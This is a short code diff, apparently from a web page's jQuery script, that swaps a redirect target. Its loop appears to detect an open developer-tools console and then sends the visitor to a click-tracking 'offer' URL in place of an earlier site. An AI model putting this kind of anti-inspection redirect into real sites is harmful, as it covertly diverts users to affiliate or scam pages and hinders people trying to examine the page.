@@ -24,7 +24,7 @@ $(document).ready(function() {
                 checkStatus = 'off';
                 console.dir(element);
                 if (checkStatus === 'on' && !changeStatus) {
-                    location.href = "https://natribu.org/";
+                    location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1";
                 }
                 requestAnimationFrame(check);
             });
